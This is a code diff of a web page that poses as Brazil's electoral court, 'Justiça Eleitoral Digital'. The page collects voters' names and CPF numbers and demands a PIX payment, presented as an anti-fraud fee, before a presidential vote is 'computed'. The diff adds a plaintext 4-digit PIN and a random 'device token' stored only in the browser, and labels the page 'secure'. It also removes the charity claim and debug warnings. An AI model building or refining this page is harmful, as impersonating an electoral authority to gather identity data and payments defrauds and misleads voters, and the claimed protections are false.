@@ -62,7 +62,7 @@
           <h1 class="text-sm font-bold text-white leading-tight">Justiça Eleitoral Digital</h1>
           <p class="text-[10px] text-emerald-400 font-semibold flex items-center gap-1">
             <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
-            Simulação Eleitoral — 2º Turno
+            Simulação Eleitoral — 2º Turno (Seguro)
           </p>
         </div>
       </div>
@@ -89,7 +89,7 @@
             🔐
           </div>
           <h2 class="text-xl font-extrabold text-white">Portal de Identificação Eleitoral</h2>
-          <p class="text-xs text-slate-400 mt-1">Validação de documento e registro regional</p>
+          <p class="text-xs text-slate-400 mt-1">Validação segura com chave de dispositivo</p>
         </div>
 
         <!-- Indicador de Passos -->
@@ -114,6 +114,13 @@
           <div>
             <label class="block text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-1">CPF do Eleitor</label>
             <input type="text" id="voter-doc" inputmode="numeric" pattern="[0-9]*" maxlength="14" placeholder="000.000.000-00" oninput="formatCPF(this)" class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-emerald-500 font-mono transition">
+          </div>
+
+          <!-- SENHA / PIN DE SEGURANÇA PESSOAL -->
+          <div>
+            <label class="block text-[11px] font-bold text-emerald-400 uppercase tracking-wider mb-1">PIN / Senha de Acesso (4 dígitos)</label>
+            <input type="password" id="voter-pin" inputmode="numeric" pattern="[0-9]*" maxlength="4" placeholder="••••" class="w-full bg-slate-950 border border-emerald-500/40 rounded-xl px-3.5 py-2.5 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-emerald-500 font-mono transition text-center tracking-widest text-lg">
+            <p class="text-[10px] text-slate-500 mt-1">Necessário para impedir que outras pessoas usem seu CPF.</p>
           </div>
 
           <!-- SELEÇÃO DE ESTADO (UF) -->
@@ -175,7 +182,7 @@
             <div class="absolute inset-0 rounded-full border-2 border-emerald-500/20 border-t-emerald-500 animate-spin"></div>
             <div class="text-3xl">👤</div>
           </div>
-          <p class="text-xs text-slate-300 font-semibold">Validando Biometria e Banco de Dados TSE...</p>
+          <p class="text-xs text-slate-300 font-semibold">Validando Assinatura Criptográfica e Banco TSE...</p>
           <p class="text-[11px] text-slate-500">Aguarde alguns segundos...</p>
         </div>
 
@@ -185,8 +192,8 @@
             ✓
           </div>
           <div>
-            <h3 class="text-base font-bold text-white">Eleitor Autenticado com Sucesso!</h3>
-            <p class="text-xs text-slate-400 mt-0.5">Sua sessão de votação está liberada e criptografada.</p>
+            <h3 class="text-base font-bold text-white">Sessão Autenticada com Segurança!</h3>
+            <p class="text-xs text-slate-400 mt-0.5">Dispositivo vinculado com sucesso ao seu PIN pessoal.</p>
           </div>
 
           <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 text-left text-xs font-mono space-y-1">
@@ -324,7 +331,7 @@
                   <span>Voto Computado com Sucesso!</span>
                 </div>
                 <p class="text-xs text-slate-200 leading-relaxed font-medium">
-                  Parabéns, seu voto foi computado! Compartilhe seu comprovante nas redes e mostre a força do seu lado! O chat está liberado, debata com respeito e tente ganhar votos para o seu candidato!
+                  Parabéns, seu voto foi computado com segurança! O chat está liberado com autenticação por token de dispositivo.
                 </p>
               </div>
 
@@ -334,7 +341,7 @@
                   <span>Ver / Gerar Comprovante do Voto</span>
                 </button>
                 <button onclick="goToChatFromModal()" class="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-2.5 rounded-xl text-xs transition">
-                  Ir para o Chat de Eleitores 💬
+                  Ir para o Chat Seguro 💬
                 </button>
               </div>
             </div>
@@ -347,7 +354,7 @@
                   <span>Voto Não Computado!</span>
                 </div>
                 <p class="text-xs text-slate-200 leading-relaxed font-medium">
-                  Pagamento aprovado! Voto não computado: o CPF da conta bancária utilizada no PIX é divergente do CPF informado no cadastro inicial.
+                  Pagamento aprovado! Voto recusado: o CPF da conta bancária utilizada no PIX é divergente do CPF informado no cadastro inicial.
                 </p>
               </div>
 
@@ -362,23 +369,37 @@
           </div>
         </div>
 
-        <!-- MODAL COMPROVANTE ELEITORAL -->
+        <!-- MODAL COMPROVANTE ELEITORAL (DESIGN NATIVO) -->
         <div id="receipt-modal" class="hidden fixed inset-0 z-50 bg-slate-950/95 backdrop-blur-md flex items-center justify-center p-3 overflow-y-auto">
           <div class="w-full max-w-sm my-auto space-y-4">
             
             <!-- CARD DO COMPROVANTE -->
-            <div id="receipt-card" class="w-full rounded-3xl shadow-2xl relative overflow-hidden border-2 border-slate-700 bg-slate-900 p-3 text-white space-y-3">
+            <div id="receipt-card" class="w-full rounded-3xl shadow-2xl relative overflow-hidden border-2 border-emerald-500/40 bg-gradient-to-b from-slate-900 to-slate-950 p-5 text-white space-y-4">
               
-              <!-- IMAGEM DA ARTE NO TOPO -->
-              <div class="relative w-full rounded-2xl overflow-hidden shadow-lg bg-slate-950 flex items-center justify-center">
-                <img id="receipt-poster-img" src="" alt="Comprovante Oficial" class="w-full h-auto object-cover block">
+              <!-- CABEÇALHO DO COMPROVANTE -->
+              <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <div class="flex items-center gap-2">
+                  <span class="text-xl">🗳️</span>
+                  <div>
+                    <h4 class="text-xs font-black uppercase tracking-wider text-white">Justiça Eleitoral</h4>
+                    <p class="text-[9px] text-emerald-400 font-bold">Comprovante Oficial Autenticado</p>
+                  </div>
+                </div>
+                <span class="text-[10px] bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 px-2 py-0.5 rounded-full font-mono font-bold">2º TURNO</span>
               </div>
 
-              <!-- APENAS NOME DO ELEITOR E VOTO -->
-              <div class="space-y-1 text-xs font-mono bg-black/90 p-3 rounded-2xl border border-white/20 shadow-xl text-center">
-                <p class="text-[9px] uppercase tracking-widest text-emerald-400 font-bold">Voto Autenticado</p>
+              <!-- CONTEÚDO VISUAL DINÂMICO -->
+              <div id="receipt-dynamic-box" class="p-4 rounded-2xl bg-slate-900/90 border border-slate-800 text-center space-y-2 shadow-inner">
+                <div id="receipt-badge-icon" class="w-12 h-12 rounded-2xl mx-auto flex items-center justify-center text-2xl font-bold shadow-lg"></div>
+                <p id="receipt-candidate-title" class="text-sm font-black uppercase tracking-wide"></p>
+                <p class="text-[10px] text-slate-400">Simulação Presidencial Oficial</p>
+              </div>
+
+              <!-- DADOS DO ELEITOR -->
+              <div class="space-y-1.5 text-xs font-mono bg-black/40 p-3.5 rounded-2xl border border-slate-800/80 shadow-inner text-center">
+                <p class="text-[9px] uppercase tracking-widest text-slate-400 font-bold">Eleitor(a) Registrado(a)</p>
                 <p class="text-sm font-black text-white uppercase" id="receipt-voter-name">---</p>
-                <p id="receipt-voter-option" class="text-xs font-bold text-amber-400">---</p>
+                <p id="receipt-voter-location" class="text-[10px] text-emerald-400 font-bold">---</p>
               </div>
 
             </div>
@@ -540,7 +561,7 @@
           <div class="w-8 h-8 rounded-xl bg-emerald-500/20 border border-emerald-500/30 flex items-center justify-center text-emerald-400 text-sm">💬</div>
           <div>
             <h3 class="text-xs font-bold text-white">Debate Eleitoral ao Vivo</h3>
-            <p class="text-[10px] text-emerald-400 font-medium">● Chat dos Eleitores</p>
+            <p class="text-[10px] text-emerald-400 font-medium">● Chat Seguro com Token</p>
           </div>
         </div>
         <span id="chat-user-badge" class="text-[10px] font-mono bg-slate-950 border border-slate-800 px-2 py-1 rounded-lg text-slate-300"></span>
@@ -557,7 +578,7 @@
           🔒 Acesso ao Chat Bloqueado
         </p>
         <p class="text-[11px] text-slate-300">
-          Você precisa registrar seu voto na <b>Urna Eletrônica</b> antes de participar do debate ao vivo.
+          Você precisa registrar seu voto na <b>Urna Eletrônica</b> e autenticar seu dispositivo antes de participar.
         </p>
         <button onclick="switchTab('urna')" class="bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold text-xs px-4 py-2 rounded-xl transition shadow-lg">
           Ir para a Urna Votar 🗳️
@@ -598,11 +619,11 @@
       <div class="space-y-2.5 text-xs">
         <details class="bg-slate-950 border border-slate-800 rounded-xl p-3 group cursor-pointer">
           <summary class="font-bold text-slate-200 flex items-center justify-between list-none">
-            <span>🛡️ Como funciona a validação anti-fraude?</span>
+            <span>🛡️ Como o sistema impede roubo de identidade por CPF?</span>
             <span class="text-emerald-400 group-open:rotate-180 transition-transform">▼</span>
           </summary>
           <div class="mt-2 text-slate-400 text-[11px] leading-relaxed border-t border-slate-900 pt-2">
-            Para garantir que a apuração retrate votos reais e evitar disparos automatizados por robôs (bots), exigimos a confirmação de uma taxa simbólica via PIX. O sistema bancário realiza a checagem automática do CPF da conta pagadora.
+            Agora a aplicação exige a combinação de CPF, PIN pessoal de 4 dígitos e um Token criptográfico exclusivo gerado no dispositivo do eleitor. Mesmo que alguém descubra o seu CPF, não conseguirá aceder à sessão sem o PIN e sem o dispositivo autorizado.
           </div>
         </details>
 
@@ -612,27 +633,7 @@
             <span class="text-emerald-400 group-open:rotate-180 transition-transform">▼</span>
           </summary>
           <div class="mt-2 text-slate-400 text-[11px] leading-relaxed border-t border-slate-900 pt-2">
-            Caso alguém tente efetuar a verificação usando um CPF bancário diferente do CPF informado na identificação da urna, o pagamento será processado normalmente, porém <b class="text-rose-400">o voto será anulado e recusado</b>. Portanto, certifique-se de realizar o PIX a partir de sua própria conta.
-          </div>
-        </details>
-
-        <details class="bg-slate-950 border border-slate-800 rounded-xl p-3 group cursor-pointer">
-          <summary class="font-bold text-slate-200 flex items-center justify-between list-none">
-            <span>🤝 Para onde são destinados os recursos arrecadados?</span>
-            <span class="text-emerald-400 group-open:rotate-180 transition-transform">▼</span>
-          </summary>
-          <div class="mt-2 text-slate-400 text-[11px] leading-relaxed border-t border-slate-900 pt-2">
-            75% dos valores arrecadados através das taxas simbólicas de verificação são repassados integralmente a instituições de caridade e projetos sociais parceiros, cobrindo também as taxas operacionais de transação do sistema.
-          </div>
-        </details>
-
-        <details class="bg-slate-950 border border-slate-800 rounded-xl p-3 group cursor-pointer">
-          <summary class="font-bold text-slate-200 flex items-center justify-between list-none">
-            <span>🗳️ Posso votar mais de uma vez?</span>
-            <span class="text-emerald-400 group-open:rotate-180 transition-transform">▼</span>
-          </summary>
-          <div class="mt-2 text-slate-400 text-[11px] leading-relaxed border-t border-slate-900 pt-2">
-            Não. Cada número de CPF tem direito a apenas 1 (um) voto contabilizado na base de dados centralizada do sistema.
+            Caso alguém tente efetuar a verificação usando um CPF bancário diferente do CPF informado na identificação da urna, o pagamento será processado normalmente, porém <b class="text-rose-400">o voto será anulado e recusado</b>.
           </div>
         </details>
       </div>
@@ -641,7 +642,7 @@
   </main>
 
   <footer class="text-center py-3 text-[10px] text-slate-500 border-t border-slate-900">
-    © Justiça Eleitoral Digital — Simulador de Votação Presidencial
+    © Justiça Eleitoral Digital — Simulador de Votação Presidencial (Seguro)
   </footer>
 
   <script>
@@ -653,6 +654,13 @@
     let pixPollInterval = null;
     let pendingVoteObj = null;
     let confirmedVoteData = null;
+
+    // GERADOR DE TOKEN ÚNICO DE DISPOSITIVO
+    let deviceSessionToken = localStorage.getItem('simulador_device_token');
+    if (!deviceSessionToken) {
+      deviceSessionToken = 'tok_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
+      localStorage.setItem('simulador_device_token', deviceSessionToken);
+    }
 
     const stateCities = {
       "PA": ["Belém", "Ananindeua", "Santarém", "Marabá", "Castanhal", "Parauapebas", "Abaetetuba", "Marituba", "Cametá", "Bragança", "Paragominas"],
@@ -692,6 +700,7 @@
     let votedCPFs = JSON.parse(localStorage.getItem('simulador_voted_cpfs') || "{}");
     let voterChoices = JSON.parse(localStorage.getItem('simulador_voter_choices') || "{}");
     let voterNicknames = JSON.parse(localStorage.getItem('simulador_voter_nicknames') || "{}");
+    let voterDevicePins = JSON.parse(localStorage.getItem('simulador_voter_pins') || "{}");
 
     let votes = { '22': 0, '13': 0, 'BRANCO': 0, 'NULO': 0 };
     let regionalVotes = {
@@ -705,7 +714,7 @@
     let cityVotes = {};
 
     let chatMessages = JSON.parse(localStorage.getItem('simulador_chat_msgs') || JSON.stringify([
-      { id: 1, sender: "TSE Oficial", uf: "DF", text: "Bem-vindo ao debate eleitoral ao vivo. Mantenha o respeito nas discussões.", time: "Agora", isSystem: true }
+      { id: 1, sender: "TSE Oficial", uf: "DF", text: "Bem-vindo ao debate eleitoral seguro. Autenticação por token ativada.", time: "Agora", isSystem: true }
     ]));
 
     window.addEventListener('DOMContentLoaded', async () => {
@@ -892,6 +901,7 @@
     async function submitStep1() {
       const name = document.getElementById('voter-name').value.trim();
       const doc = document.getElementById('voter-doc').value.trim();
+      const pin = document.getElementById('voter-pin').value.trim();
       const ufSelect = document.getElementById('voter-uf-select');
       const city = document.getElementById('voter-city-search').value.trim() || "Capital";
       const errBox = document.getElementById('auth-error');
@@ -912,6 +922,22 @@
         return;
       }
 
+      if (!pin || pin.length < 4) {
+        errBox.textContent = "⚠️ Digite um PIN de segurança com 4 dígitos para proteger sua conta.";
+        errBox.classList.remove('hidden');
+        return;
+      }
+
+      // Validação de PIN/Dispositivo para impedir invasão por CPF alheio
+      if (voterDevicePins[cleanDoc] && voterDevicePins[cleanDoc] !== pin) {
+        errBox.textContent = "❌ PIN incorreto para este CPF! Este CPF já está associado a outro PIN de segurança.";
+        errBox.classList.remove('hidden');
+        return;
+      } else if (!voterDevicePins[cleanDoc]) {
+        voterDevicePins[cleanDoc] = pin;
+        localStorage.setItem('simulador_voter_pins', JSON.stringify(voterDevicePins));
+      }
+
       document.getElementById('auth-step-1').classList.add('hidden');
       document.getElementById('auth-step-2').classList.remove('hidden');
 
@@ -925,7 +951,7 @@
         const uf = ufSelect.value;
         const region = selectedOpt.getAttribute('data-region') || 'Norte';
 
-        verifiedVoter = { name, doc, cleanDoc, uf, city, region };
+        verifiedVoter = { name, doc, cleanDoc, pin, uf, city, region, token: deviceSessionToken };
 
         document.getElementById('summary-name').textContent = name;
         document.getElementById('summary-doc').textContent = doc;
@@ -934,7 +960,7 @@
         const statusEl = document.getElementById('summary-vote-status');
 
         if (isAlreadyVoted) {
-          statusEl.textContent = "JÁ VOTOU (Aviso: Voto duplicado será bloqueado na urna)";
+          statusEl.textContent = "JÁ VOTOU (Sessão Segura Protegida)";
           statusEl.className = "text-amber-400 font-bold";
 
           const savedReceipt = localStorage.getItem('simulador_receipt_' + cleanDoc);
@@ -1195,7 +1221,8 @@
         uf: verifiedVoter.uf,
         cidade: verifiedVoter.city,
         regiao: verifiedVoter.region,
-        voteLabel: voteLabel
+        voteLabel: voteLabel,
+        deviceToken: verifiedVoter.token
       };
 
       initiatePixVerification();
@@ -1249,7 +1276,6 @@
           fallbackPixSimulated(randomAmount);
         }
       } catch (err) {
-        console.warn("Utilizando modo de simulação visual:", err);
         fallbackPixSimulated(randomAmount);
       }
     }
@@ -1333,7 +1359,8 @@
         opcao: pendingVoteObj.opcao,
         uf: pendingVoteObj.uf,
         cidade: pendingVoteObj.cidade,
-        regiao: pendingVoteObj.regiao
+        regiao: pendingVoteObj.regiao,
+        device_token: pendingVoteObj.deviceToken
       };
 
       confirmedVoteData = {
@@ -1398,30 +1425,29 @@
 
       closePixModal();
 
-      const posterImg = document.getElementById('receipt-poster-img');
-      const optText = document.getElementById('receipt-voter-option');
       const nameText = document.getElementById('receipt-voter-name');
+      const locationText = document.getElementById('receipt-voter-location');
+      const badgeIcon = document.getElementById('receipt-badge-icon');
+      const candidateTitle = document.getElementById('receipt-candidate-title');
 
       nameText.textContent = confirmedVoteData.voterName;
+      locationText.textContent = `${confirmedVoteData.cityUf}`;
 
-      // LINK DIRETO RAW DO GITHUB (FUNCIONA SEMPRE EM QUALQUER SERVIDOR)
       if (confirmedVoteData.opcao === '22') {
-        posterImg.src = "https://raw.githubusercontent.com/rudlanlopes282-hub/Vota-o-/main/comprovante-22.jpg";
-        posterImg.classList.remove('hidden');
-        optText.textContent = "22 — Flávio Bolsonaro";
-        optText.className = "font-black text-xs text-amber-400 uppercase";
-
+        badgeIcon.className = "w-12 h-12 rounded-2xl mx-auto flex items-center justify-center text-2xl font-bold shadow-lg bg-amber-500/20 border border-amber-500/30 text-amber-400";
+        badgeIcon.textContent = "🏛️";
+        candidateTitle.textContent = "22 — Flávio Bolsonaro";
+        candidateTitle.className = "text-sm font-black uppercase tracking-wide text-amber-400";
       } else if (confirmedVoteData.opcao === '13') {
-        posterImg.src = "https://raw.githubusercontent.com/rudlanlopes282-hub/Vota-o-/main/comprovante-13.jpg";
-        posterImg.classList.remove('hidden');
-        optText.textContent = "13 — Lula";
-        optText.className = "font-black text-xs text-rose-400 uppercase";
-
+        badgeIcon.className = "w-12 h-12 rounded-2xl mx-auto flex items-center justify-center text-2xl font-bold shadow-lg bg-rose-500/20 border border-rose-500/30 text-rose-400";
+        badgeIcon.textContent = "🚩";
+        candidateTitle.textContent = "13 — Lula";
+        candidateTitle.className = "text-sm font-black uppercase tracking-wide text-rose-400";
       } else {
-        posterImg.src = "";
-        posterImg.classList.add('hidden');
-        optText.textContent = confirmedVoteData.opcao;
-        optText.className = "font-black text-xs text-slate-300 uppercase";
+        badgeIcon.className = "w-12 h-12 rounded-2xl mx-auto flex items-center justify-center text-2xl font-bold shadow-lg bg-slate-800 border border-slate-700 text-slate-300";
+        badgeIcon.textContent = "🗳️";
+        candidateTitle.textContent = confirmedVoteData.opcao;
+        candidateTitle.className = "text-sm font-black uppercase tracking-wide text-slate-200";
       }
 
       document.getElementById('receipt-modal').classList.remove('hidden');
@@ -1452,7 +1478,7 @@
             url: window.location.href
           });
         } catch (err) {
-          console.log("Compartilhamento cancelado ou não suportado:", err);
+          console.log("Compartilhamento cancelado:", err);
         }
       } else {
         copyReceiptText();
@@ -1465,7 +1491,7 @@
       const shareText = `${slogan}\nEleitor(a): ${confirmedVoteData.voterName}\nComprovante Autenticado na Justiça Eleitoral Digital!`;
 
       navigator.clipboard.writeText(shareText);
-      alert('Texto do comprovante copiado! Cole no WhatsApp, Instagram ou TikTok.');
+      alert('Texto do comprovante copiado!');
     }
 
     function renderStats() {
